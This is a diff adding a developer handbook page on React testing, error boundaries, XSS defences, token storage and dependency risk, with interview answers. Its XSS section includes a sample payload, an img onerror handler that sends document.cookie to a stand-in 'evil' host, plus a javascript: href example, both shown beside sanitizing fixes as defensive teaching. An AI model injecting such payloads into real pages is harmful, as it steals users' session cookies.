@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Testing, Errors &amp; Security — React</title>
+<meta name="description" content="Testing Library philosophy, error boundaries, XSS via dangerouslySetInnerHTML, token handling and dependency risk.">
+<meta name="keywords" content="React Testing Library user-event queries getByRole error boundary XSS dangerouslySetInnerHTML DOMPurify href javascript URL token storage localStorage HttpOnly CSP supply chain npm audit">
+<link rel="stylesheet" href="../assets/handbook.css">
+</head>
+<body data-page="32-react/testing-security.html" data-root="..">
+
+<div class="hb-layout">
+<main class="hb-main">
+<article class="hb-article">
+
+  <header class="hb-pagehead">
+    <h1>Testing, Errors &amp; Security</h1>
+    <p class="subtitle">React gives you less XSS protection than Angular by default. The testing philosophy is
+      the part worth internalising.</p>
+    <div class="meta">
+      <span class="lvl lvl-i">🟡 Intermediate</span>
+      <span class="lvl lvl-a">🔴 Advanced</span>
+      <span class="pill pill-must">🔥 Must know</span>
+    </div>
+  </header>
+
+  <div class="quickrev">
+    <div class="note-title">Quick revision</div>
+    <ul>
+      <li><strong>Query by role and label</strong>, not by test id or class name.</li>
+      <li><strong><code>user-event</code>, not <code>fireEvent</code></strong> — it simulates real
+        interaction.</li>
+      <li><strong>JSX escapes text by default</strong>, so <code>{userInput}</code> is safe.</li>
+      <li><strong><code>dangerouslySetInnerHTML</code> has no sanitizer</strong> — unlike Angular's
+        <code>[innerHTML]</code>.</li>
+      <li><strong>An <code>href</code> from user data can be <code>javascript:</code></strong> — React won't
+        stop it.</li>
+      <li><strong>Error boundaries catch render errors</strong>, not event handler or async errors.</li>
+      <li><strong>Tokens in memory, refresh in an HttpOnly cookie.</strong></li>
+    </ul>
+  </div>
+
+  <h2 id="testing">Testing Library's philosophy <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <div class="simple">
+    <span class="sm-label">The guiding principle</span>
+    <p><em>"The more your tests resemble the way your software is used, the more confidence they can give
+      you."</em></p>
+    <p>So you query the DOM the way a user finds things — by visible text, by role, by label — rather than by
+      implementation details like class names or component internals.</p>
+  </div>
+
+  <pre data-label="tsx — coupled to implementation" class="code-bad"><code class="language-tsx">// Breaks if the class name changes, the wrapper div moves, or state is renamed
+const button = container.querySelector('.btn-primary');
+expect(wrapper.state('isLoading')).toBe(true);
+expect(container.querySelectorAll('.row')).toHaveLength(3);</code></pre>
+
+  <pre data-label="tsx — queries the way a user would" class="code-good"><code class="language-tsx">import { render, screen } from '@testing-library/react';
+import userEvent from '@testing-library/user-event';
+
+test('submits the order and shows confirmation', async () =&gt; {
+  const user = userEvent.setup();
+  render(&lt;OrderForm onSubmit={jest.fn()} /&gt;);
+
+  // Found the way a user (or a screen reader) finds them
+  await user.type(screen.getByLabelText(/reference/i), 'ORD-1041');
+  await user.click(screen.getByRole('button', { name: /save/i }));
+
+  // Assert on what the user sees
+  expect(await screen.findByText(/order saved/i)).toBeInTheDocument();
+});</code></pre>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Query</th><th>Preference</th></tr></thead>
+      <tbody>
+        <tr><td><code>getByRole</code></td><td><strong>First choice.</strong> Matches how assistive tech sees the page</td></tr>
+        <tr><td><code>getByLabelText</code></td><td><strong>Form fields.</strong> Also verifies the label is associated</td></tr>
+        <tr><td><code>getByText</code></td><td>Non-interactive content</td></tr>
+        <tr><td><code>getByPlaceholderText</code></td><td>Only if there's no label — which is itself a problem</td></tr>
+        <tr><td><code>getByTestId</code></td><td><strong>Last resort.</strong> Invisible to users</td></tr>
+        <tr><td><code>querySelector</code></td><td>Avoid — couples to markup</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note senior">
+    <div class="note-title">Senior signal — role-based queries test accessibility for free</div>
+    <p style="margin:0">If <code>getByRole('button', { name: /save/i })</code> can't find your element, that's
+      usually because it <em>isn't</em> a button — it's a <code>div</code> with a click handler, which a screen
+      reader also can't identify.
+      <br><br>
+      So the test failing is telling you something real. Query by role and your test suite becomes a
+      <strong>partial accessibility check</strong> without any extra effort.
+      <br><br>
+      That's a genuinely good argument for the query priority, and better than "it's the recommended
+      practice". It's also why reaching for <code>getByTestId</code> to make a test pass can be hiding a real
+      problem rather than solving a testing one.</p>
+  </div>
+
+  <div class="note warn">
+    <div class="note-title"><code>user-event</code> over <code>fireEvent</code></div>
+    <p style="margin:0"><code>fireEvent.click()</code> dispatches a single click event.
+      <strong>A real click isn't one event</strong> — it's pointer down, mouse down, focus, mouse up, click.
+      <br><br>
+      <code>userEvent.click()</code> fires the whole sequence. So it catches bugs <code>fireEvent</code> misses —
+      a handler depending on focus, a disabled button that <code>fireEvent</code> will happily "click" anyway,
+      or typing that needs individual key events.
+      <br><br>
+      Same for typing: <code>fireEvent.change</code> sets the value in one go, while
+      <code>user.type</code> fires per character — which is what a debounced input or a character-limit handler
+      actually experiences.
+      <br><br>
+      Remember <code>userEvent.setup()</code> and <code>await</code> every interaction; they're async by
+      design.</p>
+  </div>
+
+  <h3 id="what-to-test">What to test, and what not to</h3>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Test</th><th>Don't test</th></tr></thead>
+      <tbody>
+        <tr><td>The user can complete the flow</td><td>That a hook was called</td></tr>
+        <tr><td>Error states render correctly</td><td>Internal state variable values</td></tr>
+        <tr><td>Loading and empty states appear</td><td>That React renders conditionally</td></tr>
+        <tr><td>Business rules in pure functions</td><td>Third-party library behaviour</td></tr>
+        <tr><td>Accessibility of key flows</td><td>Exact class names or DOM structure</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note tip">
+    <div class="note-title">Mock at the network boundary, not your own modules</div>
+    <pre data-label="tsx"><code class="language-tsx">// MSW intercepts at the network level - your fetch code runs for real
+const server = setupServer(
+  http.get('/api/orders', () =&gt; HttpResponse.json([{ id: '1', reference: 'A' }]))
+);</code></pre>
+    <p style="margin:0">Mocking your own <code>orderService.getOrders</code> means the service's real logic —
+      error handling, response mapping, retry — is never exercised, and the mock drifts from reality when the
+      service changes.
+      <br><br>
+      Intercepting HTTP means everything above the network runs genuinely, and you can assert on the request
+      shape. It also makes tests resilient to refactoring the data layer, which is exactly the kind of change you
+      want tests to survive.</p>
+  </div>
+
+  <h2 id="error-boundaries">Error boundaries <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <pre data-label="tsx — a class component, because there's no hook equivalent"><code class="language-tsx">class ErrorBoundary extends React.Component&lt;Props, State&gt; {
+  state = { hasError: false };
+
+  static getDerivedStateFromError() {
+    return { hasError: true };          // render the fallback
+  }
+
+  componentDidCatch(error: Error, info: React.ErrorInfo) {
+    logToMonitoring(error, info.componentStack);   // report it
+  }
+
+  render() {
+    if (this.state.hasError) return this.props.fallback;
+    return this.props.children;
+  }
+}</code></pre>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Caught</th><th><strong>Not</strong> caught</th></tr></thead>
+      <tbody>
+        <tr><td>Errors thrown during render</td><td><strong>Event handler errors</strong></td></tr>
+        <tr><td>Errors in lifecycle methods</td><td><strong>Async errors</strong> — promises, <code>setTimeout</code></td></tr>
+        <tr><td>Errors in constructors</td><td>Errors in the boundary itself</td></tr>
+        <tr><td></td><td>Server-side rendering errors</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note danger">
+    <div class="note-title">The gap that surprises people</div>
+    <p style="margin:0">An error boundary only catches errors thrown <strong>during rendering</strong>. So this
+      is <em>not</em> caught:
+    </p>
+    <pre data-label="tsx" class="code-bad"><code class="language-tsx">&lt;button onClick={() =&gt; { throw new Error('boom'); }}&gt;Click&lt;/button&gt;
+// Escapes to window.onerror. The boundary never sees it.</code></pre>
+    <p style="margin:0">Nor is a rejected promise in an effect, or a failed <code>fetch</code>.
+      <br><br>
+      React's reasoning is that render errors leave the UI in an unknown state and must be contained, whereas an
+      event handler error doesn't corrupt the tree — so you should handle it locally.
+      <br><br>
+      Practically that means: <strong>try/catch in handlers</strong>, React Query's error state for data, a
+      global <code>window.onerror</code> and <code>unhandledrejection</code> listener as a safety net, and error
+      boundaries for the rendering layer. No single mechanism covers everything, and assuming a boundary does is
+      the mistake.</p>
+  </div>
+
+  <div class="note tip">
+    <div class="note-title">Place boundaries per feature, not just at the root</div>
+    <p style="margin:0">A single root boundary means any render error blanks the whole application.
+      <br><br>
+      A boundary around each major region — the sidebar, a dashboard widget, a data table — means a failure in
+      one widget shows a localised "couldn't load this" while everything else keeps working.
+      <br><br>
+      That's a much better outcome and it's cheap to do. <code>react-error-boundary</code> gives a hook-friendly
+      wrapper with a reset function, so the user can retry without a full page reload.</p>
+  </div>
+
+  <h2 id="xss">XSS in React <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <div class="simple">
+    <span class="sm-label">What React protects by default</span>
+    <p>JSX <strong>escapes interpolated values</strong>. So <code>{userInput}</code> containing a script tag
+      renders as visible text, never as executable markup.</p>
+    <p>That covers the large majority of XSS risk — but React's protection is <em>narrower</em> than Angular's,
+      and the differences matter.</p>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Case</th><th>React</th><th>Angular</th></tr></thead>
+      <tbody>
+        <tr><td>Text interpolation</td><td><strong>Escaped</strong></td><td>Escaped</td></tr>
+        <tr><td>Raw HTML insertion</td><td><code>dangerouslySetInnerHTML</code> — <strong>no sanitization</strong></td><td><code>[innerHTML]</code> — <strong>sanitized</strong></td></tr>
+        <tr><td><code>href</code> with <code>javascript:</code></td><td><strong>Not blocked</strong> (warns in dev)</td><td>Sanitized</td></tr>
+        <tr><td>Style objects</td><td>Safe — object syntax, not a string</td><td>Sanitized</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note danger">
+    <div class="note-title">The two React-specific holes</div>
+    <p style="margin:0"><strong>1. <code>dangerouslySetInnerHTML</code> does nothing to sanitize.</strong>
+      Angular's <code>[innerHTML]</code> strips scripts and event handlers automatically; React's equivalent
+      inserts exactly what you give it. The name is the warning, and there is no safety net behind it.
+    </p>
+    <pre data-label="tsx" class="code-bad"><code class="language-tsx">&lt;div dangerouslySetInnerHTML={{ __html: comment.body }} /&gt;
+// &lt;img src=x onerror="fetch('//evil/'+document.cookie)"&gt; executes.</code></pre>
+    <pre data-label="tsx — sanitize explicitly" class="code-good"><code class="language-tsx">import DOMPurify from 'dompurify';
+
+&lt;div dangerouslySetInnerHTML={{
+  __html: DOMPurify.sanitize(comment.body, { ALLOWED_TAGS: ['b','i','em','strong','a','p'] })
+}} /&gt;</code></pre>
+    <p style="margin:0"><strong>2. A user-controlled <code>href</code> can be a <code>javascript:</code>
+      URL.</strong>
+    </p>
+    <pre data-label="tsx" class="code-bad"><code class="language-tsx">&lt;a href={profile.website}&gt;Website&lt;/a&gt;
+// profile.website = "javascript:steal()" - clicking it executes.</code></pre>
+    <pre data-label="tsx — validate the scheme" class="code-good"><code class="language-tsx">function safeUrl(url: string) {
+  try {
+    const parsed = new URL(url, window.location.origin);
+    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol) ? url : '#';
+  } catch { return '#'; }
+}
+&lt;a href={safeUrl(profile.website)} rel="noopener noreferrer"&gt;Website&lt;/a&gt;</code></pre>
+  </div>
+
+  <div class="note warn">
+    <div class="note-title">Sanitize server-side on write where you can</div>
+    <p style="margin:0">Sanitizing at render time means <strong>every read path has to remember</strong> — and one
+      that forgets is the vulnerability. A new component rendering the same comment field reintroduces the hole.
+      <br><br>
+      Sanitizing <em>on write</em>, server-side, means the stored value is already safe regardless of how it's
+      later displayed — including by a mobile app or an export that doesn't go through React at all.
+      <br><br>
+      Best is both: sanitize on write as the control, and on render as defence in depth. Same layered reasoning
+      as <a href="../10-sql/fundamentals.html#constraints">database constraints plus application
+      validation</a>.</p>
+  </div>
+
+  <h2 id="tokens">Token handling <span class="pill pill-must">🔥 Must know</span></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Storage</th><th>Readable by injected script?</th><th>Verdict</th></tr></thead>
+      <tbody>
+        <tr><td><code>localStorage</code></td><td><strong>Yes</strong></td><td>Avoid for tokens</td></tr>
+        <tr><td><code>sessionStorage</code></td><td><strong>Yes</strong></td><td>Same flaw, tab-scoped</td></tr>
+        <tr><td>React state / a module variable</td><td>Only while the page is open</td><td><strong>Good for access tokens</strong></td></tr>
+        <tr><td><code>HttpOnly</code> cookie</td><td><strong>No</strong></td><td><strong>Best for refresh tokens</strong></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="remember">
+    <span class="r-label">The recommended shape</span>
+    <p><strong>Short-lived access token in memory. Refresh token in an <code>HttpOnly</code>,
+      <code>Secure</code>, <code>SameSite</code> cookie.</strong></p>
+    <p>On page load there's no access token, so the app calls the refresh endpoint — which authenticates using
+      the cookie the browser sends automatically and JavaScript cannot read.</p>
+    <p>An XSS payload can then <em>use</em> the API while the page is open, which is bad. It <strong>cannot
+      exfiltrate a long-lived credential</strong> to use later from elsewhere. That's the meaningful
+      difference, and it's worth stating precisely rather than claiming XSS is solved.</p>
+    <p>Cookies mean you need <a href="../08-http-web-apis/auth-security.html">CSRF protection</a> —
+      <code>SameSite=Lax</code> plus a token on state-changing requests.</p>
+  </div>
+
+  <div class="note info">
+    <div class="note-title">Content Security Policy is the layer that limits damage</div>
+    <p style="margin:0">A strict CSP restricts what an injected script can do even when it runs — no inline
+      scripts, and <code>connect-src</code> limiting which origins can be contacted, which blocks exfiltration to
+      an attacker's domain.
+      <br><br>
+      That's the difference between "an attacker ran code" and "an attacker took your data". Worth mentioning
+      because it shows layered thinking: escaping prevents most XSS, sanitization handles the raw-HTML case,
+      <code>HttpOnly</code> limits what's stealable, CSP limits what's reachable.</p>
+  </div>
+
+  <h2 id="supply-chain">Dependency risk <span class="lvl lvl-a">🔴 Advanced</span></h2>
+
+  <div class="note warn">
+    <div class="note-title">The React ecosystem's structural weakness</div>
+    <p style="margin:0">Because React ships only a renderer, a typical application pulls in routing, data
+      fetching, forms, validation, a component library and dozens of transitive dependencies. That's a large
+      surface, and <strong>every one runs in your build and often in your users' browsers</strong>.
+      <br><br>
+      There have been real incidents where a compromised or hijacked package stole credentials from applications
+      that merely depended on it transitively.
+      <br><br>
+      Practical mitigations: <strong>lockfiles committed</strong> so builds are reproducible;
+      <code>npm audit</code> or Dependabot in CI; <code>npm ci</code> rather than <code>npm install</code> in
+      pipelines; scrutiny before adding a dependency for something small; and preferring well-maintained
+      packages over convenient obscure ones.
+      <br><br>
+      This is a fair point to raise when comparing with Angular, whose batteries-included approach means fewer
+      third-party packages for core concerns. It's a genuine trade-off rather than a criticism of React.</p>
+  </div>
+
+  <div class="takeaways">
+    <span class="t-label">Key takeaways</span>
+    <ul>
+      <li>Query by role and label; <code>getByTestId</code> is a last resort.</li>
+      <li>Role-based queries double as an accessibility check.</li>
+      <li><code>user-event</code> simulates real interaction sequences; <code>fireEvent</code> doesn't.</li>
+      <li>Mock at the network boundary so your real data code runs.</li>
+      <li>Error boundaries catch render errors only — not handlers, not async.</li>
+      <li>Place boundaries per feature so one failure doesn't blank the app.</li>
+      <li>JSX escapes text, but <code>dangerouslySetInnerHTML</code> has no sanitizer at all.</li>
+      <li>A user-supplied <code>href</code> can be <code>javascript:</code> — validate the scheme.</li>
+      <li>Sanitize server-side on write, and on render as defence in depth.</li>
+      <li>Access token in memory, refresh token in an <code>HttpOnly</code> cookie, plus CSRF protection.</li>
+      <li>CSP limits what a successful injection can reach.</li>
+      <li>A large dependency tree is a real supply-chain surface — lockfiles and auditing in CI.</li>
+    </ul>
+  </div>
+
+  <h2 id="mistakes">Common mistakes</h2>
+  <ul>
+    <li><strong>Querying by class name or test id</strong> by default.</li>
+    <li><strong><code>fireEvent</code></strong> where <code>user-event</code> would catch more.</li>
+    <li><strong>Asserting on component internals</strong> rather than rendered output.</li>
+    <li><strong>Mocking your own services</strong> instead of the network.</li>
+    <li><strong>Assuming an error boundary catches handler or async errors.</strong></li>
+    <li><strong>One root-level boundary only.</strong></li>
+    <li><strong><code>dangerouslySetInnerHTML</code> without DOMPurify.</strong></li>
+    <li><strong>Unvalidated user-supplied <code>href</code>.</strong></li>
+    <li><strong>JWTs in <code>localStorage</code>.</strong></li>
+    <li><strong>Cookies without CSRF protection.</strong></li>
+    <li><strong>No lockfile discipline or dependency auditing.</strong></li>
+  </ul>
+
+  <h2 id="interview-questions">Interview questions</h2>
+
+  <h3 id="q-intermediate">Intermediate</h3>
+
+  <details class="qa">
+    <summary>How do you prevent XSS in React? <span class="pill pill-must">🔥 Must know</span></summary>
+    <div class="qa-body">
+      <div class="say-it">
+        <span class="s-label">How I'd answer</span>
+        <p>"React's default protection is good: <strong>JSX escapes interpolated values</strong>, so
+          <code>{userInput}</code> containing a script tag renders as visible text rather than executing. That
+          covers most of the risk automatically."</p>
+        <p>"But React's protection is <strong>narrower than Angular's</strong>, and I'd want to be specific about
+          the two gaps."</p>
+        <p>"<strong><code>dangerouslySetInnerHTML</code> does no sanitization whatsoever.</strong> This is the
+          important difference — Angular's <code>[innerHTML]</code> sanitizes automatically, stripping scripts
+          and event handlers while keeping safe markup. React's equivalent inserts exactly what you hand it. The
+          alarming name is the only safeguard."</p>
+        <p>"So if I need to render rich text — a comment, a CMS field — I'd sanitize with
+          <strong>DOMPurify</strong> and an explicit allow-list of tags. And I'd prefer to sanitize
+          <strong>server-side on write</strong>, because sanitizing on render means every read path has to
+          remember, and a new component rendering the same field reintroduces the hole. Sanitizing on write
+          means the stored value is safe however it's later displayed — including by a mobile client that never
+          touches React."</p>
+        <p>"<strong>The second gap is <code>href</code>.</strong> <code>&lt;a href={profile.website}&gt;</code>
+          with a value of <code>javascript:steal()</code> executes when clicked. React warns in development but
+          doesn't block it. So any user-controlled URL needs its scheme validated — parse it and allow only
+          <code>http</code>, <code>https</code> and <code>mailto</code>. Same applies to
+          <code>src</code> on iframes and form actions."</p>
+        <p>"Then the layers beyond escaping, because escaping alone isn't a complete answer."</p>
+        <p>"<strong>Token storage.</strong> If XSS does occur, what can it take? A JWT in
+          <code>localStorage</code> is readable by any script, so it can be exfiltrated and reused later from
+          anywhere. An access token in memory plus a refresh token in an <code>HttpOnly</code> cookie means the
+          attacker can act while the page is open but can't take a durable credential away. That's a real
+          reduction in impact, and I'd be careful not to overclaim it as preventing XSS."</p>
+        <p>"<strong>Content Security Policy</strong> as defence in depth — blocking inline scripts and
+          restricting <code>connect-src</code> so an injected script can't exfiltrate to an attacker's domain.
+          That's the difference between code running and data leaving."</p>
+        <p>"<strong>And dependencies.</strong> Because React applications pull in a lot of third-party packages,
+          a compromised dependency can inject script without any XSS in my own code. Lockfiles committed,
+          <code>npm ci</code> in CI, and automated auditing. That's a genuine part of the XSS threat model for
+          React specifically, given the ecosystem's shape."</p>
+      </div>
+      <h5>What they're really checking</h5>
+      <ul>
+        <li>Do you know JSX escapes by default?</li>
+        <li>Do you know <code>dangerouslySetInnerHTML</code> has no sanitizer, unlike Angular?</li>
+        <li>Do you catch the <code>href</code> vector?</li>
+        <li>Do you sanitize on write rather than only on render?</li>
+        <li>Do you think in layers — tokens, CSP, dependencies?</li>
+      </ul>
+      <h5>Weak answers</h5>
+      <ul>
+        <li><span class="redflag">Red flag:</span> "React handles it automatically."</li>
+        <li><span class="redflag">Red flag:</span> assuming <code>dangerouslySetInnerHTML</code> sanitizes.</li>
+        <li><span class="redflag">Red flag:</span> no mention of the <code>href</code> case.</li>
+      </ul>
+      <div class="followups">
+        <div class="note-title">Likely follow-ups</div>
+        <ul>
+          <li>How would you safely render user-submitted markdown?</li>
+          <li>What's the CSRF implication of using cookies?</li>
+          <li>How does the token refresh flow work?</li>
+        </ul>
+      </div>
+    </div>
+  </details>
+
+  <h3 id="q-advanced">Advanced</h3>
+
+  <details class="qa">
+    <summary>How would you test a component that fetches data? <span class="pill pill-senior">⭐ Senior-level</span></summary>
+    <div class="qa-body">
+      <div class="say-it">
+        <span class="s-label">How I'd answer</span>
+        <p>"I'd <strong>mock at the network boundary</strong>, with something like MSW, rather than mocking my own
+          service module."</p>
+        <p>"The reason matters: if I mock <code>orderService.getOrders</code>, the service's real logic never
+          runs — no response mapping, no error handling, no retry — and the mock silently drifts from reality
+          when the service changes. Intercepting HTTP means everything above the network executes genuinely, and
+          I can assert on the request that was made."</p>
+        <p>"It also makes tests survive refactoring the data layer, which is precisely the kind of change I want
+          tests to be indifferent to."</p>
+        <p>"Then I'd cover the four states, because the failure ones are what break in production and what nobody
+          exercises manually."</p>
+        <p>"<strong>Loading</strong> — the skeleton or spinner appears. <strong>Success</strong> — the data
+          renders. <strong>Error</strong> — configure the handler to return a 500 and assert the error UI and
+          any retry affordance. <strong>Empty</strong> — an empty array shows the empty state, not a blank
+          region, which is a genuinely common bug."</p>
+        <p>"On assertions I'd use <code>findBy*</code> queries for anything asynchronous, since they retry until
+          the element appears or time out. Using <code>getBy*</code> immediately after render fails because the
+          fetch hasn't resolved — and the instinct to fix that with an arbitrary
+          <code>await new Promise(r =&gt; setTimeout(r, 100))</code> is what makes suites flaky. Let the query do
+          the waiting."</p>
+        <p>"And I'd query by <strong>role and label</strong> rather than test ids. Beyond resilience to markup
+          changes, if <code>getByRole('button', { name: /retry/i })</code> can't find the element, that's usually
+          because it isn't a real button — which a screen reader also can't identify. So the query priority gives
+          me a partial accessibility check for free."</p>
+        <p>"Two React Query specifics. I'd create a <strong>fresh <code>QueryClient</code> per test</strong> with
+          retries disabled — otherwise cached data leaks between tests and produces order-dependent failures,
+          and the default retry makes an error test wait through several attempts. I'd wrap that in a custom
+          render helper so every test gets the provider without repetition."</p>
+        <p>"What I'd deliberately <em>not</em> test: that React Query caches correctly, or that
+          <code>useEffect</code> fires. That's testing the library. I'd test my component's behaviour given
+          particular server responses."</p>
+        <p>"For the genuinely complex parts — a mapping function, a business rule deciding what's displayed —
+          I'd pull those into pure functions and unit test them directly. Far cheaper than driving them through
+          a rendered component, and it makes the component test simpler because there's less logic left in
+          it."</p>
+      </div>
+      <h5>What they're really checking</h5>
+      <ul>
+        <li>Do you mock the network rather than your own modules, and know why?</li>
+        <li>Do you test error and empty states, not just success?</li>
+        <li>Do you use <code>findBy</code> instead of arbitrary waits?</li>
+        <li>Do you know the fresh-QueryClient-per-test requirement?</li>
+        <li>Do you avoid testing the library?</li>
+      </ul>
+      <h5>Weak answers</h5>
+      <ul>
+        <li><span class="redflag">Red flag:</span> mocking the service module.</li>
+        <li><span class="redflag">Red flag:</span> only testing the happy path.</li>
+        <li><span class="redflag">Red flag:</span> arbitrary <code>setTimeout</code> waits.</li>
+      </ul>
+      <div class="followups">
+        <div class="note-title">Likely follow-ups</div>
+        <ul>
+          <li>How do you test an optimistic update and its rollback?</li>
+          <li>How do you keep tests from leaking state between each other?</li>
+          <li>When would you write an E2E test instead?</li>
+        </ul>
+      </div>
+    </div>
+  </details>
+
+</article>
+</main>
+</div>
+
+<script src="../assets/nav-data.js"></script>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/handbook.js"></script>
+</body>
+</html>
